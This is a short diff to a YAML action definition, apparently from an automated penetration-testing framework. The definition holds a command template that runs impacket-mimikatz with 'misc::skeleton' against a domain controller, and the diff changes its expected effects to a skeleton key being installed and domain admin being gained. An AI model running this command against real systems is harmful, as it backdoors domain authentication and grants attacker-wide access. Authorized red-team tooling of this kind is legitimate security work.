@@ -8,9 +8,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-mimikatz -dc-ip {target_ip} '{domain}/{username}:{password}'
   'privilege::debug' 'misc::skeleton'
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- skeleton_key_installed
+- domain_admin
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
